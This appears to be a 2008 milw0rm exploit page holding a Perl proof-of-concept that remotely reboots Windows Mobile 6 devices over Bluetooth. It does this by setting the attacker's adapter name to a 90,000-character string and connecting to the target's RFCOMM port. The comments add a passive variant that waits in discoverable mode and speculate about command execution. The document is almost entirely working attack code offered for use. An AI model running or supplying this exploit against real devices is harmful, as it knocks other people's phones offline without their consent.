<html><head><title>Windows Mobile 6.0 Device long name Remote Reboot Exploit  </title></head><pre>#!/usr/bin/perl
#
# ----------WM6 remote overflow reboot PoC----------
# Simple exploit for remote rebooting a windows mobile device
# Maybe we can use it for doing command execution,
# I've not test it since the device is rebooting and do not dump a core
# for further analysing.
#
# The bug is not realy in the long string name but when it's the first
# time the wm6 device try to get a connection with too long name. 
#
# There's two way to exploit this bug, this PoC show the first method 
# (direct connect to the device if we know the bdaddr) but you can
# just wait for the device to search and overflow by itself when
# seeing the hci name:
# hciconfig &lt;hci dev&gt; name `perl -e 'print &quot;A&quot;x90000'`
# hciconfig &lt;hci dev&gt; piscan
# You just have to wait until the wm device search for bluetooth devices
# in range and it will be overflowed
#
#  *Tested on WM6 fully patched  on [HTC wiza 200],[HTC Mda 8125]
# (by Julien Bedard)
#

use Net::Bluetooth;

$target=$ARGV[0];
$hci_dev=$ARGV[1];
$overflow=&quot;A&quot; x 90000;
$rfcomm_port=&quot;3&quot;;

if (@ARGV &lt; 2)
{
die &quot;Usage:\n       ./wm6_dos.pl &lt;target_mac&gt; &lt;hci_device&gt;\n\n&quot;;
}

# change this lame cmd ???
system(&quot;hciconfig $hci_dev name $overflow&quot;);

$over_conn = Net::Bluetooth-&gt;newsocket(&quot;RFCOMM&quot;);
print &quot;socket error $!\n&quot; unless(defined($over_conn));
$over_conn-&gt;connect($target, $rfcomm_port);

# milw0rm.com [2008-09-26]</pre></html>